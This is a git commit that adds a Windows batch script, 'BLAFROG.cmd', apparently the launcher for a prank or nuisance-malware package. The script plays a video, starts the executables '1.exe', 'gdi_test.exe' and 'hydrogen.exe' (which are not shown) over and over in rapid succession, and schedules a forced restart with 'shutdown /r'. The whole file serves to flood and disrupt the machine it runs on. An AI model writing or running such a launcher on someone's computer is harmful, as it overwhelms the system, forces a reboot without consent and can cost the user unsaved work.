64b85fb8f6402bc4d0209aab2f75035f1343d0ed
canal-tv <ctv425040@gmail.com>
2025-03-26 19:52:50 -0700

    Add files via upload

---
+++ sorce code/BLAFROG.cmd
@@ -0,0 +1,38 @@
+@echo off
+
+start bfdi.mp4
+timeout 5
+start 1.exe
+timeout 2
+start gdi_test.exe
+start hydrogen.exe
+start bfdi.mp4
+start 1.exe
+start 1.exe
+start bfdi.mp4
+timeout 1
+start 1.exe
+timeout 1
+start 1.exe
+timeout 1
+start 1.exe
+timeout 1
+start 1.exe
+timeout 1
+start 1.exe
+timeout 1
+start 1.exe
+timeout 1
+start 1.exe
+timeout 1
+start 1.exe
+timeout 1
+start 1.exe
+timeout 1
+start 1.exe
+shutdown /r /t 1000
+start 1.exe
+start hydrogen.exe
+timeout 2
+start 1.exe
+exit
